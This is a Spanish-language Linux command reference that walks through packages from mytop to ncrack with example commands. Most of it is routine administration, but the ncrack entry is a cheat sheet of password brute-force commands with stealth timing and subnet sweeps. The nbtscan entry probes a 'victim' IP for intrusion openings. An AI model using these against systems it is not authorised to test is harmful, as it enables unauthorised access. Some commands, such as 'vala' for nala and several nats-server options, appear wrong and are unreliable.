batchmode=0 (Con valor 1 mostrará por pantalla todas las consultas una detrás de otra sin recargar la página. Si el valor es 0 cada vez que se refresque la página se borrarán las consultas anteriores)
header=1 (Valor 1 muestra la cabecera)
color=1 (en color)
idle=1 (que muestre los resultados de las consultas que están dormidas)
Conceptos que muestra la pantalla de mytop:
	Queries (Número tatal de consultas)
	qps (Media de consultas por segundo)
	qps now (Número de consultas por segundo desde la última vez que se descargaron resultados)
	Slow (Número de consultas lentas)
	Slow qps (Consultas lentas desde la última descarga de resultados)
	Se/In/Up/De (indica cual es el porcentaje de Select, Insert, Update o Delete que se ejecutan en el servidor)
	key efficiency (Porcentaje de consultas que están utilizado una clave/índice en la consulta)
	Bps in/out (Media de bytes por segundo entrantes a la base de datos y media de bytes por segundo salientes)
	Now in/out (Media de bytes entrantes y salientes por segundo desde que mytop ha refrescado la página)
Teclas interactivas:
	d (Mostrar solo datos de una base de datos)
	f (Mostrar información completa de una consulta)
	F (Desactivar todos los filtros)
	h (Mostrar solamente los datos de un servidor específico)
	H (Mostrar/ocultar cabecera)
	i (Mostrar/ocultar consultar dormidas)
	k (Matar una consulta)
	p (Pausar la vista)
	m (Cambiar "consultas más lentas" a "consultas por segundo")
	o (Invertir orden)
	q (Salir)
	r (Resetear todos los valores)
	s (Cambiar el tiempo de refresco)
	t (Cambiar al modo vista)
	u (Mostrar solamente de un usuario específico)


n2n
Demonio de red privada virtual [VPN] que utiliza una arquitectura Peer-to-Peer [P2P] lo que significa que los nodos pueden comunicarse directamente entre sí sin necesidad de pasar siempre por un servidor central, aunque sí requiere un nodo especial llamado supernodo para facilitar la conexión inicial y el descubrimiento de pares. Incluye las herramientas supernode [servidor de coordinación] y edge [el cliente].
# supernode -l 1234 (iniciar un supernodo. Escucha en un puerto, por defecto 1234 y permite que los edge se registren)
# edge -d n2n0 -a 10.1.1.10 -c mi_red -k secreto123 -l 203.0.113.10:1234 (unirse a una comunidad llamada mi_red y el supernode está en 203.0.113.10:1234)
-d n2n0 --> nombre de la interfaz virtual, puede ser tun0, edge0, etc.
-a 10.1.1.10 --> dirección IP única que tomará este nodo dentro de la red n2n.
-c mi_red --> nombre de la comunidad y debe coincidir con otros nodos.
-k secreto123 --> clave compartida para cifrado, opcional, pero recomendado.
-l 203.0.113.10:1234 --> dirección del supernodo.
$ ip addr show n2n0 (verificar la interfaz)
$ ip route (muestra las rutas)


nagios
Es un sistema de monitorización y gestión de hosts, servicios y redes. Se trata de un metapaquete que instala tanto el demonio de monitorización como la interfaz web.
# sudo nagios4 -v /etc/nagios4/nagios.cfg (verificar la configuración sin ejecutarla)
# systemctl enable nagios4.service (activar el demonio en el arranque)                                                                |
# nagios4stats (muestra el estado)
# nagios4 /etc/nagios4/nagios.cfg (ejecuta manualmente Nagios con la configuración indicada)                             |
1.-
Activar la interfaz web en http://localhost/nagios
Nagios4 usa Apache2 y los CGIs [Common Gateway Interface] para mostrar su interfaz web.
# apt install nagios4 nagios4-cgi apache2 (asegúrar tener los paquetes instalados)
# a2enconf nagios4-cgi (habilitar el módulo si no lo ha hecho al instalar)
# systemctl reload apache2 (reiniciar apache2)
# sudo htpasswd -c /etc/nagios4/htpasswd.users nagiosadmin (crear un usuario por defecto nagiosadmin)
Reiniciar servicios
# systemctl restart nagios4
# systemctl restart apache2
Probar acceso web. Abrir el navegador con la URL http://localhost/nagios4


nagvis
[NAGios VISualization]. Herramienta gráfica y web que se integra con Nagios Core para mostrar visualmente el estado de los hosts y servicios con mapas, esquemas de red, topologías o paneles donde cada icono cambia de color según el estado [OK, WARNING, CRITICAL…].
# a2enconf nagvis (en caso que durante la instalación no se haya habilitado)
# systemctl reload apache2 (recargar la nueva configuración de apache2 con nagvis)
Se accede a la página principal en un servidor local con el navegador en htts.//localhost/nagvis. Por defecto nombre usuario y contraseña son admin admin.


nagzilla
Sistema de retransmisión de mensajería para el protocolo Jabber [XMPP]. Un sistema de retransmisión significa que puede tomar mensajes desde una sala de chat, dentro del protocolo Jabber y reenviarlos a otro lugar, como una sala distinta o a contactos específicos. Se divide en dos programas: nagzillad: el demonio que se encuentra en la sala y envía los mensajes, y nagzillac: el cliente que recibe los mensajes y se los entrega al demonio.
# systemctl enable nagzillad (habilitar el daemon en el inicio del sistema)


nailgun
Cliente, protocolo y servidor para ejecutar programas Java desde la línea de comandos sin la sobrecarga de inicio de la JVM [Java Virtual Machine] que debe iniciarse desde cero, lo que puede tardar varios segundos y así ejecuciones que normalmente tardan 2-3 segundos pueden completarse en menos de 100ms.
$ java -jar nailgun-server.jar & (iniciar servidor con un JAR específico)
$ java -cp nailgun-server.jar:tuapp.jar com.facebook.nailgun.NGServer (especificar tu propio classpath)
$ java -cp "nailgun-server.jar:~/.m2/repository/*:target/classes" \ (iniciar servidor con el classpath del proyecto)
El servidor queda ejecutándose en segundo plano, escuchando en el puerto 2113 por defecto.
$ ng com.ejemplo.MiPrograma arg1 arg2 (ejecutar una clase Java)
$ ng org.apache.tools.ant.Main clean compile (ejecutar herramientas comunes si están en el classpath)
$ ng org.junit.runner.JUnitCore com.miapp.MiTest (ejecutar tests rápidamente)
$ ng ng-stats (ver si el servidor está ejecutándose)
$ ng ng-stop (detener el servidor)
1.-
java -cp nailgun-server.jar com.facebook.nailgun.NGServer :2114 & (cambiar puerto)
ng --nailgun-port 2114 MiClase


nala
Nala es una interfaz para el gestor de paquetes APT que comparte gran parte de la misma funcionalidad, pero formatea la salida para que sea más legible. También implementa una función de historial para ver transacciones pasadas y deshacerlas/rehacerlas. Practicamente todos los argumentos de nala son iguales a los de apt.
# vala update (equivalente a apt update)
# vala upgrade (equivalente a apt upgrade)
# vala history (lista de paquetes en la caché)
# vala autoremove (equivalente a apt autoremove)
# vala clean (limpiar caché. Equivalente a apt clean)


namecheck
Consulta nombres de proyectos que no esten tomados. Cada nuevo proyecto requiere un nombre y estos han de ser únicos. Proponer nombres es difícil para asegurarse que no esten ya en uso y esta herramienta contiene una lista de sitios y patrones para evaluar.
$ namecheck tqñas-up84
	Testing tqñas-up84.tuxfamily.org - Available
	Testing    alioth.debian.org - Available
	Testing        launchpad.net - Available
	Testing     savannah.gnu.org - Available
	Testing      sourceforge.net - Available
	Testing        www.ohloh.net - Available
	Testing  projects.apache.org - Available
	The name 'tqñas-up84' doesn't appear to be in use.


namei
Mostrar la ruta desde el directorio raiz hasta donde especifiquemos.
$ namei $(pwd) (hasta el presente directorio)
$ namei -m $(pwd)/archivo (mostrando permisos y propietarios)


nameif
Modificar la MAC de una tarjeta de red dañada. Imaginemos el caso de un pc con dos tarjetas (eth0 y eth1) en el que la eth0 se estropea, con nameif podemos cambiar de interfaz la eth1 para ser la eth0:
# ifconfig eth1 (Averiguar la MAC de la eth1)
eth1      Link encap:Ethernet  HWaddr 00:23:54:57:fc:78
# ifconfig eth1 down (bajar la red eth1)
# nano /etc/init.d/networking
Añadir a continuación de la linea del PATH:
PATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"
nameif eth0 00:23:54:57:fc:78
....
Reiniciar el servicio:
# /etc/init.d/networking restart
Comprobar que eth1 se ha convertido en eth0:
# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:23:54:57:fc:78


names
Un generador de nombres aleatorios con nombres adecuados para instancias de contenedores, nombres de proyectos, instancias de aplicaciones, etc.
$ names -n 5 (genera 5 nombres)
  	harmonious-pancake-6908
	minor-hearing-8363
	remarkable-news-7020
	taboo-snails-0969
	steady-mailbox-9551


nano
editor de texto.
$ nano -wx texto (Abrir "texto" inhabilitando "final de linea" [wrap] y la ayuda [x])
Nota.- "wrap" es la cantidad de caracteres de una linea y puede especificarse en los parámetros de nano.
$ nano +10 archivo (abrir archivo y con el cursor en la linea 10)
Archivo de configuración. Crear:
$ touch .nanorc
Algunos parámetros a incluir:
set backup (Guarde copias con la extensión ~)
set linenumbers  (Muestra el número de lineas)
set casesensitive (distinguir mayúsculas y minúsculas en las búsquedas)
set mouse (Habilita el uso del mouse. Precisa paquete gpm)
set tabsize 4 (Número de espacios en la tabulación. Por defecto 8)
set tabstospaces (convierte tabulaciones en espacios)
set nohelp (inhabilitar la ayuda de forma permanente)
set fill 60 (Número se caracteres por linea[wrap])
set titlecolor red (título en rojo)
Atajos
	Ctrl + g (Menú ayuda)
	Ctrl + j (Justificar el párrafo actual)
	Ctrl + k (Cortar y guardar la línea actual)
	Ctrl + m (Insertar un retorno de carro)
	Ctrl + o (Escribir el fichero actual a disco)
	Ctrl + v (Moverse hacia el final del documento)
	Ctrl + w (Buscar una palabra en el texto)
	[Ctrl + w] + [Ctrl + r] (Buscar palabra y reemplazarla por otra)
	Ctrl + y (Moverse hacia el principio del documento)
	Ctrl + x (Salir de nano)
	Ctrl + d (Muestra número de palabras, lineas y caracteres)
	Ctrl + A (Empezar a marcar text. Con las flechas completar el trozo)
        Alt + 6 (Copiar el trozo marcado con Ctrl + A)
	Ctrl + u (Pegar la linea copiada/cortada)
	Mayu + Insert (Insertar del portapapeles)
	Alt + m (Soporte para ratón habilitar/deshabilitar. Precisa paquete gpm)
	Alt + y (Coloreado de sintaxis habilitar/deshabilitar)
	Alt + x (Suprimir/añadir la ayuda del final de página)
1- Solución al problema:
	$ nano .bashrc
	Error reading /home/<username>/.nano_history: Permission denied
	Press Enter to continue starting nano.
# nano /etc/nanorc
Y comentar la entrada:
	#set historylog
2- Activar el coloreado de sintaxis para los lenguajes de programación:
$ nano ~/.nanorc
Y colocar la linea:
  include /usr/share/nano/*.nanorc


nano-tiny
es una versión especial y minimalista del programa nano [ver], diseñada para los disquetes de arranque o discos de emergencia de Debian.


nanoc
es un generador de sitios estáticos que toma archivos fuente como Markdown, HTML, Sass, etc, los procesa mediante reglas y produce un sitio web estático listo para ser desplegado. La clave es que el sitio generado es una colección de archivos HTML, CSS y JavaScript que no requieren una base de datos ni procesamiento del lado del servidor.
$ mkdir blog
$ nanoc create-site blog (crear la estructura del sitio)
      create  Gemfile
      create  nanoc.yaml
      create  Rules
      create  content/index.html
      create  content/stylesheet.css
      create  layouts/default.html
      Created a blank Nanoc site at 'blog'. Enjoy!
content/ --> Contiene los archivos fuente del sitio: páginas, publicaciones...
layouts/ --> Contiene plantillas como headers y footers, para dar formato al contenido.
lib/ --> Para código Ruby personalizado: filtros, helpers...
Rules --> Donde se define cómo se deben procesar los archivos.
nanoc.yaml --> Opciones de configuración generales.
$ bundle3.3 exec nanoc (compilar el sitio)
$ nanoc compile (creará una carpeta llamada output/ que contendrá todos los archivos HTML, CSS y demás generados, listos para ser subidos a un servidor web)
$ nanoc view (el sitio estará accesible en http://localhost:3000)


nanofilt
Herramienta de línea de comandos diseñada para el filtrado y recorte de datos de secuenciación de lecturas largas. Su función principal es permitir a los usuarios filtrar y procesar secuencias de ADN o ARN obtenidas a través de tecnologías de secuenciación de nueva generación.
$ nanofilt -q 10 < input.fastq > output.fastq (filtrar las secuencias con una calidad mínima de 10 de un archivo de secuencias de ADN en formato FASTQ y salida output.fastq)
$ nanofilt -l 1000 < input.fastq > output.fastq (filtrar secuencias con una longitud mínima de 1000 pb)
$ nanofilt -q 10 -l 1000 < input.fastq > output.fastq (filtrar secuencias con una calidad mínima de 10 y una longitud mínima de 1000 pb)
$ nanofilt -q 10 -l 1000 --trim < input.fastq > output.fastq (recortar las secuencias después de pasar los filtros)
$ nanofilt -q 10 -l 1000 --trim input.fastq > output.fastq (leer directamente desde un archivo sin comprimir)


nanoid
Crea contraseñas.
$ nanoid -s 10 (de 10 letras mayúsculas y minúsculas)
$ nanoid -s 15 -a .,-rtadls:_ (de 15 aracteres usando los signos y letras especificados con -a)


nas
Este paquete contiene el demonio NAS [Network Audio System], necesario para la salida de audio del servidor local para que los dispositivos de audio como reproductores, micrófonos, altavoces, etc. se conecten entre sí y con estaciones de trabajo a través de una red para reproducir, grabar y manipular datos. Incluye la aplicación start-nas
# start-nas (poner el daemon en marxa)
# nasd -aa -local (permite conexión de cualquier cliente y solo de clientes en el host local)


nas-bin
Cliente para el servidor de audio NAS [ver]. Incluye las aplicaciones auconvert, auctl, audemo, audial, auedit, auinfo, aupanel, auphone, auplay, aurecord, auscope, autool, auwave, checkmail, issndfile, playbucket y soundtoh.
$ auconvert input.au output.wav (convierte un archivo de audio de formato .au a .wav)
$ auctl volume 75 (ajusta el volumen al 75%)
$ audemo (ejecuta la demo interactiva)
$ audial 123456789 (intenta marcar el número de teléfono especificado usando un módem compatible con NAS. Solo red de Norte America)
$ auedit archivo.au (abre el archivo de audio para edición básica)
$ auinfo (muestra información sobre el servidor NAS y los dispositivos de audio disponibles)
$ aupanel (panel de control gráfico para NAS)
$ auphone usuario@servidor (inicia una llamada de voz al usuario especificado)
$ auplay archivo.wav (reproduce un archivo de audio a través del servidor NAS)
$ aurecord salida.au (graba audio desde el micrófono o entrada de línea usando NAS y lo guarda en salida.au)
$ auscope (osciloscopio de audio, muestra visualmente la forma de onda del audio)
$ auwave (demuestra el uso de formas de onda)
$ checkmail (reproduce un sonido cuando llega correo nuevo)
$ issndfile archivo.au (Comprueba si un archivo está en un formato de archivo de audio reconocido)
$ playbucket -volume 50 ~/Música (reproduce todos los archivos de sonido en el directorio especificado al 50$ del volumen [0-100])
$ soundtoh archivo.au (convertir un archivo de sonido a un archivo de cabecera de lenguaje C)


nast
Detectar usuarios, inalámbricos o no, de una red local. Como herramienta de análisis, tiene muchas características como:  Crear lista de hosts LAN, Seguir secuencias TCP-DATA, Encontrar puertas de enlace a Internet LAN, Descubre nodos promiscuos, Restablece conexiones establecidas, Realizar escáner de puertos medio abiertos, Buscar tipos de enlaces, Capturar banners del demonio de los nodos LAN, Controlar respuestas arp para descubrir posibles suplantaciones ...
      # nast (de forma interactiva informa de paquetes recibidos y los descartados por el kernel)
      Packets Received: 		581690
      Packets Dropped by kernel:	0
# nast -m (los que estan en la misma LAN)
# nast -g (dónde hay un gateway)
# nast -S (especificando una ip y un puerto. Acepta rango de puertos 1-400 o varios separados por comas 20,22,23,50-70)
# nast -C any (sin utilizar ningún filtro)
# nast -c -B (comprueba si alguien está envenenando con arp)


nat-traverse
Establece conexiones entre nodos que se encuentran detrás de gateways NAT, es decir, hosts que no tienen direcciones IP públicas. Es una herramienta que permite la comunicación directa entre dos máquinas que están detrás de NAT sin necesidad de servidores intermediarios ni reconfiguración de routers ni configuración adicional.
# nat-traverse --server 5000 ssh -p %p localhost (en el host A el que actúa como "servidor")
# nat-traverse --client 5000 <IP_publica_A> ssh -p %p usuario@localhost (en el host B, el cliente. La variable %p es reemplazada automáticamente por el puerto UDP negociado)
# nat-traverse --client 6000 <IP_A> nc %p < archivo_enviar.tar.gz (enviar un archivoo en host B. el emisor)
# nat-traverse --server 6000 nc -l -p %p > archivo_recibido.tar.gz (recibir archivo en host A,  el receptor)
# nat-traverse --server 5555 pppd updetach noauth passive notty ipparam vpn 10.0.0.1:10.0.0.2 (VPN con pppd en host A)
# nat-traverse --client 5555 <IP_A> pppd updetach noauth notty ipparam vpn 10.0.0.2:10.0.0.1 (VPN en host B)
# nat-traverse --server 5900 vncviewer localhost:%p (escritorio remoto [VNC] en host A)
# nat-traverse --client 5900 <IP_A> x11vnc -display :0 -rfbport %p (en host B)
# nat-traverse --server 8000 rsync -av --port=%p /ruta/origen/ destino/ (sincronización con rsync en host A)
# nat-traverse --client 8000 <IP_A> rsync -av --port=%p origen/ /ruta/destino/ (sincronización con rsync en host B)
Nota.- No es cifrado. nat-traverse solo establece el túnel el cifrado depende del protocolo que se use, SSH lo proporciona, netcat no.
1.-
Ejemplo práctico
Acceder por SSH desde una laptop fuera de casa al PC de casa, detrás de un router doméstico:
En casa
$ curl ifconfig.me (obtener IP pública)
Supongamos que devuelve 203.0.113.45
Iniciar nat-traverse
$ nat-traverse --keepalive 25 --server 4500 ssh -p %p localhost
Des de la laptop fuera de casa:
$ nat-traverse --keepalive 25 --client 4500 203.0.113.45 ssh -p %p usuario@localhost
Se establecerá una sesión SSH directa sin configurar port forwarding en el router


native-architecture
Metapaquete que solo existe para declarar una dependencia lógica relacionada con la arquitectura del sistema.
$ dpkg --print-architecture (ver arquitectura nativa)
Si un paquete contiene la caracteristica:
      Depends: native-architecture
Solo está diciendo que se puede instalar si el sistema amd64 coincide con la arquitectura nativa aunque esté habilitada con Multi-Arch [dpkg --add-architecture i386]
$ apt show native-architecture (mostrar descripción)


natlog
Utilidad de registro de firewall con NAT de origen. Los firewalls como iptables suelen ofrecer funciones de traducción de direcciones de red de origen POSTROUTING que cambian la dirección de origen de un host detrás del firewall a la dirección del host antes del firewall. Las funciones de registro estándar de iptables no permiten fácilmente asociar las direcciones detrás del firewall con sus equivalentes con NAT de origen antes del firewall. Natlog se diseñó para cubrir esta necesidad específica. Al ejecutar natlog, se envían mensajes al demonio syslog o a la salida estándar, mostrando las características esenciales de la conexión mediante NAT de origen.
# systemctl enable natlog (activar el servicio al iniciar el sistema)
# natlog -s tun0 eth0 (captura paquetes en tun0 [interno] y eth0 [externo]. Se ejecuta como demonio, enviando logs a syslog. Verlos con tail -f /var/log/syslog)
# natlog --no-daemon --no-syslog -s tun0 eth0 (ejecución en primer plano [foreground] con salida a stdout, sin syslog)
# natlog --time --protocol udp -s br0 eth0 (con timestamps legibles por humanos y solo protocolo UDP)
# natlog conntrack (listar conexiones actuales en lugar de capturar paquetes en vivo)


nats-server
Servidor de comunicaciones sencillo, seguro y de alto rendimiento para sistemas, servicios y dispositivos digitales. El servidor puede ejecutarse localmente, en la nube, en el edge e incluso en una Raspberry Pi. Es el daemon principal que ejecuta una instancia de NATS [https://nats.io/], una red de distribución de mensajes [Message Queue based] que permite enviar y recibir mensajes de forma confiable y entre varios servicios. Configuración en /etc/nats-server.conf
$ nats-server -c (inicia un servidor Nats que no utiliza una configuración predefinida y crea un archivo de configuración al iniciar)
$ nats-server -m security (inicia el servidor en modo seguro. Bloquea la transmisión de mensajes no solicitados y requiere autenticación y autorización para enviar y recibir mensajes)
$ docker run -p 4222:4222 -v /path/to/config:/etc/nats/nats.conf nats (iniciar un servidor Nats en un contenedor, especificando el puerto y el archivo de configuración)
$ nats-server stop (detener el servidor Nats)


nautilus
Navegador de archivos de gnome
$ nautilus -q  (salir de nautilus)
$ nautilus -c  (Realizar una serie rápida de pruebas de autoevaluación)
$ nautilus -g 1200x400 (arrancarlo con determinadas medidas)
Para abrir lugares especiales en nautilus, colocarse sobre el escritorio GNOME y pulsar Mayúscula+7. Se abrirá una ventana “abrir lugar” y, en ella, escribiremos:
	computer:///  (Mostrar unidades y SO)
	network:///   (los sitios de la Red.)
	fonts:///   (ver las tipografías instaladas.)
	burn:///   (abre ventana grabar CD/DVD.)
	themes:///   (temas disponibles de GNOME.)
nautilus terminal
	# add-apt-repository ppa:flozz/flozz
	# apt-get update && sudo apt-get install nautilus-terminal
	$ nautilus -q
Extensión de Nautilus que permite tener una consola incrustada, sincronizada con el explorador.
Ctrl + Shift + t   (mostrar)
Ctrl + Shift + h  (ocultar)
Añadir “NUEVA PESTAÑA” en la barra de nautilus
# nano /usr/share/nautilus/ui/nautilus-navigation-window-ui.xml
Y pegar en la sección toolbar:
	<toolitem name="New Tab" action="New Tab"/>
Reiniciar
Atajos
	Ctrl+A (Seleccionar todo)
	Ctrl+C (Copiar)
	Ctrl+H (Muestra archivos ocultos)
	Ctrl+N (Abre nueva pantalla)
	Ctrl+T (Abre una nueva pestaña)
	Ctrl+Alt+D (Mostrar escritorio)
	Ctrl+Shft+N (Crear nueva carpeta)
	Shft+F10 (Activa el menú contextual para el elemento activo)
	Alt+Enter (Mostrar propiedades del elemento activo)
	Alt+Flechas (Desplazarse entre carpetas)
	Alt+tab (Navegar entre ventanas/documentos activos)
	Alt+espacio (Abre el menú de la ventana actual)
	F2 (Renombrar carpeta)


nbdkit
Kit de herramientas para crear servidores NBD [Network Block Device], un protocolo que permite acceder a dispositivos de almacenamiento en bloque, como discos duros, imágenes de disco o volúmenes virtuales, a través de una red, como si fueran dispositivos locales.
$ nbdkit -f file disk.img (ejecuta en primer plano)
$ nbdkit -p 10810 file disk.img (dirección IP para escuchar, por defecto todas las interfaces)
$ nbdkit -v -i 127.0.0.1 file disk.img (mensajes detallados)
$ nbdkit -r file disk.img (exporta el dispositivo como solo lectura)
$ nbdkit --filter=partition file disk.img partition=1 (aplica un filtro, "partition" para particiones, "xz" para compresión)
Filtro "xz" descomprime sobre la marcha y el filtro "partition" limita al offset de la partición 1 [detecta automáticamente].
$ nbdkit --tls=require file disk.img (requiere conexiones encriptadas)
$ nbdkit --run 'guestfish -a nbd://localhost' file disk.img (ejecuta un comando cliente y mata nbdkit al terminar)
$ nbdkit -U /tmp/nbd.sock file disk.img (usa un socket Unix en lugar de TCP)
$ nbdkit --filter=partition --filter=xz file disk.img.xz partition=1 (aplica filtros "partition" y "xz" para extraer la partición 1 de disk.img.xz)
$ nbdkit --filter=error --filter=delay memory size=100M error-rate=10% rdelay=1 wdelay=1 (simula un disco de 100 MB en RAM, agregando errores y delays para probar clientes)
$ nbdkit --tls=require --run 'guestfish --rw -a nbd://localhost' file disk.img (sirve un archivo con TLS requerido y ejecuta guestfish automáticamente al inicio)


nbsdgames
Juegos para la terminal. Colección de juegos textuales con IA, modo de 2 jugadores, tamaño de tablero flexible, color, compatibilidad con mouse, etc. Incluye los siguientes:  battleship, checkers, fifteen, fisher, jewels, memoblocks, miketron, mines, muncher, pipes, rabbithole, redsquare, reversi, sos y sudoku.


nbtscan
Para ver máquinas que compartan información en una red por medio del protocolo NetBIOS [windows utiliza este protocolo para sus comunicaciones] GNU/Linux, BSD, Solaris y Mac utiliza el servicio samba por lo cual también serán detectados sus recursos compartidos.
# nbtscan 192.168.0.0/24  (Obtener nombres de los PCs de nuestra red)
# nbtscan -v 192.168.0.0/24  (Obtener la tabla NetBIOS de cada uno de los PCs que encuentre)
# nbtscan -r 192.168.2.0/24  (Para escanear completamente toda la red)
# nbtscan -v -s : 192.168.2.0/24  (Lo mismo con información por columnas)
# nbtscan -r 192.168.2.1-64  (Escanear por un rango de ips)
# nbtscan -f listado   (Escanear a partir de un archivo de ips)
El archivo listado tendrá un formato:
192.168.2.3
192.168.2.6
192.168.2.11
...
# nbtstat -A Ip_victima  (si hay algun pc al que se pueda entrar)
Si muestra la entrada <20> será susceptible de intrusion.
	LOKO <00> UNIQUE Registered
	CHEPUDO <00> GROUP Registered
	LOKO <03> UNIQUE Registered
	LOKO <20> UNIQUE Registered
	CHEPUDO <1E> GROUP Registered


ncal
Calendario. Casi igual que la aplicación cal [ver]
$ ncal -C (con los dias encina los números. Por defecto al lado)
$ ncal -y 2018 -C (muestra todo el año especificado)
$ ncal -m 2 (muestra el segundo mes del año)
$ ncal -3 (muestra el anterior, el presente y el proximo)
$ ncal -A 2 (los proximos tres meses [0,1 y 2])
$ ncal -B 2 (los anteriores tres meses [2, 1 y 0])


ncaptool
Utilidad para capturar y analizar tráfico de redes similar a libpcap diseñada para ser una alternativa a tcpdump.
# ncaptool -i eth0 (capturar paquetes en una interfaz)
# ncaptool -i eth0 -w captura.pcap (guardar la captura en un archivo)
# ncaptool -r captura.pcap (leer un archivo de captura)
# ncaptool -i eth0 tcp (filtrar por protocolo)
# ncaptool -i eth0 host 192.168.1.1 (filtrar por dirección IP)
# ncaptool -i eth0 port 80 (filtrar por puerto)
# ncaptool -i eth0 -c 10 (limitar el número de paquetes capturados a 10)
# ncaptool -i eth0 -v (mostrar información detallada de los paquetes)
# ncaptool -i eth0 "greater 100" (captura solo paquetes mayores a 100 bytes)


ncdc
Programa para compartir archivos mediante protocolos Direct Connect [DC]. Es compatible con varios clientes populares como EiskaltDC++, DC++, AirDC++, FlylinkDC++ y otros que utilizan estos protocolos. Ncdc también es interoperable con todo el software de concentrador DC [servidores] común que utiliza los protocolos DC y Advanced DC. Su función principal es actuar como un cliente o nodo en la red de intercambio de archivos basada en DC, permitiendo a los usuarios compartir y buscar archivos en la red.
$ ncdc -n MiUsuario -m dc.server.com:411 -c (define nombre de usuario en la red DC y el host y puerto del servidor a conectar.)
$ ncdc -n MiUsuario -u "Mi Red" -g grupo (nombre de la red o grupo a unirse y grupo de chat o canal)
$ ncdc -d /ruta/a/compartir -n MiUsuario -m dc.server.com:411 (especifica la ruta del directorio que se desea compartir en la red)


ncdt
Muestra un árbol de directorios muy parecido al árbol estándar del comando tree[ver]. Imprime información resumida en lugar del tamaño de archivo especial del directorio e información sobre archivos mp3.
Es particularmente útil para indexar CDs.
$ ncdt -d -b (mostrar sólo los directorios e imprimir información de su tasa de bits)


ncdu
Muestra el espacio usado por los archivos y directorios del directorio actual. Como “du” pero mostrando graficos y color.
$ ncdu /home/usuario


ncftp
Cliente FTP que permite al usuario transferir archivos desde y hacia un servidor remoto, y ofrece funciones adicionales que no están disponibles en la interfaz estándar de FTP. Incluye las herramientas ncftp3, ncftpbatch, ncftpbookmarks, ncftpget, ncftpls, ncftpput y ncftpspooler.
$ ncftp -u USER ftp.servidor.net (Se conecta y entra en modo interactivo. Comandos típicos: ls, cd, get [bajar del servidor], put [subir], quit)
$ ncftpget -u USER -p PASSWD ftp.servidor.net /remoto/backup.tar.gz /home/USER/descargas/ (descarga archivo.zip a la carpeta actual)
$ ncftpget -R -u USER -p PASSWD ftp.servidor.org /remoto/docs /home/USER/archivos (descarga en local la carpeta remota de forma recursiva)
$ ncftpput -R -v -u USER -p PASSWD -z servidor.com /destino/remoto /origen/local/carpeta (sube la carpeta local completa [-R recursivo] al directorio remoto y reanudar la transferencia si es necesario y en modo verbose)
$ $ ncftpls -u USER servidor.com /home/USER/docs (lista los archivos del directorio remoto sin necesidad de una sesión interactiva)
$ ncftpput -bb -u USER -p PASSWD servidor.com /destino archivo.zip (envía el trabajo a la cola. El trabajo se ejecutará cuando se inicie ncftpbatch)
$ ncftpput -b -u USER -p PASSWD servidor.com /destino archivo.zip (con una sola -b intenta ejecutar ncftpbatch inmediatamente después de poner el trabajo en cola)
$ ncftpbatch (inicia el procesador de lotes si no está ya ejecutándose como daemon)
$ ncftpbatch -d (inicia el proceso en modo daemon para gestionar las tareas pendientes de transferencia)
$ ncftpspooler -d (iniciar el daemon de spooler global para procesar tareas de múltiples usuarios o sistemas)


ncmpc
Cliente de texto para el protocolo MPD [Music Player Daemon] y se utiliza para reproducir audio. Su objetivo es proporcionar una interfaz de teclado consistente para MPD y evitar abrir múltiples terminales o aplicaciones gráficas mientras se reproduce música.
$ ncmpc (entrar en la interfaz de la aplicación)


ncmpcpp
Reproductor de música. Al ser del tipo cliente-servidor, Precisa mpd [ver] arrancado.
En el archivo de configuración, que tiene que crearse, sólo es necesario especificar el directorio de música:
$ nano .ncmpcpp/config
mpd_music_dir = "/home/usuario/Musica"
Algunas teclas de control:
	F1 (Ayuda)
	F2 (Lista de reproducción)
	F3 (Explorador)
	F4 (Busca en la base de datos)
	F5 (Libreria)
	F6 (Editor de listas de reproduccion)
	F7 (Editor de etiquetas)
	F8 (Outputs)
	F9 (Visualizador musical)
	F10 (Reloj)
	@ (Informacion del servidor mpd)
	s (Detiene la reproducción)
	p (Cambia la visualización)
	P (Pausa la reproducción)
	Backspace (Pone el tema desde inicio)
	< (Tema anterior)
	> (Tema siguiente)


ncompress
Programas originales de compresión/descompresión Lempel-Ziv [LZW] que fueron el estándar de facto de UNIX.
$ compress archivo.txt (comprimir un archivo. Crea archivo.txt.Z y elimina el original)
$ compress -v -f -c archivo.txt > archivo.txt.Z (comprimir manteniendo el original en modo verbose y forzar aunque no ahorre espacio)
$ compress -b 12 archivo.txt (comprimir con diferentes niveles. 9-16 bits, por defecto 16)
$ uncompress.real archivo.txt.Z (descomprimir. Elimina el .Z)
$ uncompress -c archivo.txt.Z > archivo_recuperado.txt (descomprimir a stdout. Mantiene el .Z)


ncrack
Herramienta cracker de autenticación de red de alta velocidad diseñado específicamente para probar la fortaleza de contraseñas en diversos servicios y protocolos de red. Fue creada para ayudar a proteger redes mediante pruebas proactivas de todos los hosts y dispositivos de red en busca de contraseñas débiles. Se diseñó con un enfoque modular, una sintaxis de línea de comandos similar a Nmap y un motor dinámico que adapta su comportamiento según la información de la red.
$ ncrack -v ssh://192.168.1.100 (ataque a servicio SSH con diccionario por defecto)
$ ncrack -v -u admin -P passwords.txt ssh://192.168.1.100 (especificando usuario y diccionario personalizado)
$ ncrack -v ssh://192.168.1.100 ftp://192.168.1.100 http://192.168.1.100 (escanear SSH, FTP y HTTP en un mismo objetivo)
$ ncrack -v ssh://192.168.1.100:2222 ftp://192.168.1.100:2121 (especificando puertos no estándar)
$ ncrack -U users.txt -P passwords.txt ssh://192.168.1.100 (usando diferentes diccionarios)
$ ncrack -U users_pass.txt -P users_pass.txt ssh://192.168.1.100 (mismo archivo para usuarios y contraseñas)
$ ncrack -v http://192.168.1.100 (ataque de autenticación HTTP básica)
$ ncrack -v https://192.168.1.100 (lo mismo con HTTPS)
$ ncrack -v http://192.168.1.100/admin (especificando ruta de autenticación)
$ ncrack -v mysql://192.168.1.100 (ataque a base de datos)
$ ncrack -v pgsql://192.168.1.100 (lo mismo en base de datos PostgreSQL)
$ ncrack -v mysql://192.168.1.100:3306/database_name (especificando base de datos)
$ ncrack -T5 ssh://192.168.1.100 (ataque más rápido. Puede ser detectado más fácilmente)
$ ncrack -T1 ssh://192.168.1.100 (ataque sigiloso. Más lento)
$ ncrack --connections 10 ssh://192.168.1.100 (límite de conexiones simultáneas a 10)
$ ncrack --delay 1s ssh://192.168.1.100 (delay entre intentos)
$ ncrack -v ssh://192.168.1.100,192.168.1.101,192.168.1.102 (escaneo múltiples hosts)
$ ncrack -v ssh://192.168.1.1-50 (escaneo de un rango de IPs)
$ ncrack -v -v ssh://192.168.1.0/24 (máxima información y escaneo de red completa)
